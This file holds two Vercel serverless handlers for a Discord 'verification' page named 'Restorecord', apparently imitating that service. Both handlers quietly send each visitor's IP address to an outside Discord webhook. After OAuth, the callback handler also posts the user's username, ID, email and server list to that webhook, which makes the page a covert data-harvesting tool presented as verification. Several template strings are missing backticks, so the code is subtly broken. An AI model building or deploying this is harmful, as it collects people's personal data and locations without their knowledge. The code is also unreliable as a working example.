// === VERCEL API === // File: /api/verify.js

export default async function handler(req, res) { const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";

const discordClientId = "YOUR_CLIENT_ID"; const redirectUri = "https://restorecord-three.vercel.app/api/callback"; const webhookURL = "YOUR_WEBHOOK_URL";

// Log IP await fetch(webhookURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [ { title: "New IP Visit", color: 0xffcc00, description: "" + `IP Address: ${ip}` + "", footer: { text: "Restorecord Logs" }, timestamp: new Date().toISOString() } ] }), }).catch(() => {});

const discordOAuthUrl = https://discord.com/oauth2/authorize?client_id=${discordClientId} + &redirect_uri=${encodeURIComponent(redirectUri)} + &response_type=code&scope=identify%20email%20guilds;

res.writeHead(302, { Location: discordOAuthUrl }); res.end(); }

// === VERCEL API === // File: /api/callback.js

export default async function handler(req, res) { const code = req.query.code; if (!code) return res.status(400).send("Code not provided");

const clientId = "YOUR_CLIENT_ID"; const clientSecret = "YOUR_CLIENT_SECRET"; const redirectUri = "https://restorecord-three.vercel.app/api/callback"; const webhookURL = "YOUR_WEBHOOK_URL";

const params = new URLSearchParams(); params.append("client_id", clientId); params.append("client_secret", clientSecret); params.append("grant_type", "authorization_code"); params.append("code", code); params.append("redirect_uri", redirectUri); params.append("scope", "identify email guilds");

const tokenResponse = await fetch("https://discord.com/api/oauth2/token", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params.toString(), });

if (!tokenResponse.ok) return res.status(500).send("Token exchange failed"); const tokenData = await tokenResponse.json();

const userResponse = await fetch("https://discord.com/api/users/@me", { headers: { Authorization: Bearer ${tokenData.access_token} }, });

const guildsResponse = await fetch("https://discord.com/api/users/@me/guilds", { headers: { Authorization: Bearer ${tokenData.access_token} }, });

if (!userResponse.ok || !guildsResponse.ok) return res.status(500).send("Failed to fetch user data");

const userData = await userResponse.json(); const guildsData = await guildsResponse.json();

const guildList = guildsData.slice(0, 10).map(g => • ${g.name} (${g.id})).join("\n") || "None";

const userIp = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";

await fetch(webhookURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [ { title: "New Verification Log", color: 0x2b2d31, description: "" + `Username : ${userData.username}#${userData.discriminator}\n` + `User ID : ${userData.id}\n` + `Email   : ${userData.email || "Not Available"}\n` + `IP      : ${userIp}\n\n` + `Servers:\n${guildList}` + "", footer: { text: "Restorecord Logs", }, timestamp: new Date().toISOString() } ] }), }).catch(console.error);

// Call the bot (Replit) to assign role await fetch("https://YOUR-REPLIT-APP-URL.grant-role.repl.co/grant-role", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ user_id: userData.id }) }).catch(console.error);

res.status(200).send("Verification complete. You can close this tab."); }

